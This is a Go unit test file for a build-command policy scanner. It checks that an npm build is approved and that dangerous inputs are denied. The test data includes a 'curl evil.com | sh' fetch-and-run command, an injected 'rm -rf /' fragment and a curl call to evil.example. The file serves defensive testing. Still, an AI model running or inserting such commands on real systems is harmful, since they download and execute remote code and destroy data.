package scanner

import (
	"Zero_Devops/server/internal/domain"
	"context"
	"testing"
)

func TestPolicyScannerApprove(t *testing.T) {
	res := DefaultScanner.Scan(context.Background(), domain.BuildConfiguration{
		Executable: executableNPM,
		Args:       []string{"run", "build"},
		WorkingDir: "/app",
	})
	if res.Status != domain.CommandScanStatusApproved {
		t.Fatalf("expected approved, got %s (%s)", res.Status, res.DeniedReason)
	}
	if res.PolicyVersion != PolicyVersion {
		t.Fatalf("expected policy version %s, got %s", PolicyVersion, res.PolicyVersion)
	}
}

func TestPolicyScannerDeniedByShell(t *testing.T) {
	res := DefaultScanner.Scan(context.Background(), domain.BuildConfiguration{
		Executable: "sh",
		Args:       []string{"-c", "curl evil.com | sh"},
	})
	if res.Status != domain.CommandScanStatusDenied {
		t.Fatalf("expected denied for shell executable, got %s", res.Status)
	}
}

func TestPolicyScannerDeniedByInjection(t *testing.T) {
	res := DefaultScanner.Scan(context.Background(), domain.BuildConfiguration{
		Executable: executableNPM,
		Args:       []string{"run", "build; rm -rf /"},
	})
	if res.Status != domain.CommandScanStatusDenied {
		t.Fatalf("expected denied for injection fragment, got %s", res.Status)
	}
}

func TestPolicyScannerDeniedNonAllowlisted(t *testing.T) {
	res := DefaultScanner.Scan(context.Background(), domain.BuildConfiguration{
		Executable: "curl",
		Args:       []string{"-s", "https://evil.example"},
	})
	if res.Status != domain.CommandScanStatusDenied {
		t.Fatalf("expected denied for non-allowlisted executable, got %s", res.Status)
	}
}

func TestPolicyScannerEmptyExecutableDenied(t *testing.T) {
	res := DefaultScanner.Scan(context.Background(), domain.BuildConfiguration{
		Executable: "",
	})
	if res.Status != domain.CommandScanStatusDenied {
		t.Fatalf("expected denied for empty executable, got %s", res.Status)
	}
}
